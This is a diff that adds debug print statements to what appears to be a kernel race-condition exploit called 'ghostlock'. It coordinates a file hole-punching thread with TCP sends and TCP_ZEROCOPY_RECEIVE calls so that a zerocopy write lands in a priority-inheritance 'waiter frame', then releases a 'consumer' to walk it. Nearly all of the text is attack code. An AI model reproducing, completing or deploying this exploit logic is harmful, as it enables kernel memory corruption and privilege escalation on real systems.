@@ -162,12 +162,16 @@ namespace ghostlock::route {
                !context->punch_stop.load()) {
             sched_yield();
         }
+        pr_info("[dbg] punch go released\n");
         while (!context->punch_stop.load()) {
+            static int dbg_i = 0;
+            if (dbg_i < 3) pr_info("[dbg] punch fill start n=%d\n", dbg_i);
             if (fallocate(context->punch_fd.get(), 0, 0, (off_t) context->mapping_length) != 0) {
                 context->punch_failed.store(errno ? errno : EIO);
                 pr_warning("tcp punch fill errno=%d\n", errno);
                 break;
             }
+            if (dbg_i < 3) pr_info("[dbg] punch fill ok n=%d\n", dbg_i);
             context->punch_phase.store(1);
             if (fallocate(context->punch_fd.get(),
                           FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
@@ -178,6 +182,7 @@ namespace ghostlock::route {
                 context->punch_failed.store(errno ? errno : EIO);
                 pr_warning("tcp punch hole errno=%d\n", errno);
             }
+            if (dbg_i < 3) { pr_info("[dbg] punch hole ok n=%d\n", dbg_i); dbg_i++; }
             context->punch_phase.store(0);
             if (context->punch_failed.load()) {
                 break;
@@ -277,6 +282,7 @@ namespace ghostlock::route::tcp_zerocopy {
                 attempts, arm_seq, post_hold);
 
         punch_go.store(1);
+        pr_info("[dbg] tcp: puncher released\n");
         /* custom-write mode: fire the PI walk immediately */
         race->route_delay_usec.store(0);
 
@@ -284,10 +290,15 @@ namespace ghostlock::route::tcp_zerocopy {
         sendbuf.fill(0x33);
 
         for (int32_t i = 1; i <= attempts && !route_won; i++) {
+            if (i <= 60)
+                pr_info("[dbg] tcp seq=%d pre-send phase=%d failed=%d calls=%d success=%d\n",
+                        i, punch_phase.load(), punch_failed.load(),
+                        race->consumer_calls.load(), race->consumer_success.load());
             int32_t calls_before = race->consumer_calls.load();
             int32_t success_before = race->consumer_success.load();
             (void) send(server_fd.get(), sendbuf.data(), sendbuf.size(),
                         MSG_DONTWAIT);
+            if (i <= 60) pr_info("[dbg] tcp seq=%d post-send\n", i);
             while (punch_phase.load()) {
                 sched_yield();
             }
@@ -323,10 +334,14 @@ namespace ghostlock::route::tcp_zerocopy {
             int32_t ret = getsockopt(client_fd.get(), IPPROTO_TCP,
                                  TCP_ZEROCOPY_RECEIVE, zc.data(),
                                  &len);
+            if (i <= 60)
+                pr_info("[dbg] tcp seq=%d post-zc ret=%d errno=%d len=%u\n",
+                        i, ret, errno, (unsigned)len);
             int32_t saved_errno = errno;
             /* release the consumer only once the zerocopy write landed in the
          * waiter frame; earlier release walks a half-written waiter */
             if (i >= arm_seq && ret == 0) {
+                pr_info("[dbg] tcp seq=%d ARMING (consumer released)\n", i);
                 race->consumer_go.store(i);
                 for (int32_t spin = 0; spin < post_hold; spin++) {
                     __asm__ volatile (
@@ -335,7 +350,10 @@ namespace ghostlock::route::tcp_zerocopy {
                     "yield"
                     ::: "memory");
                 }
+                pr_info("[dbg] tcp seq=%d post-hold; waiting consumer idle\n", i);
                 route::tcp_wait_for_consumer_idle(this);
+                pr_info("[dbg] tcp seq=%d idle ok calls=%d success=%d\n", i,
+                        race->consumer_calls.load(), race->consumer_success.load());
             }
 
             int32_t calls = race->consumer_calls.load();
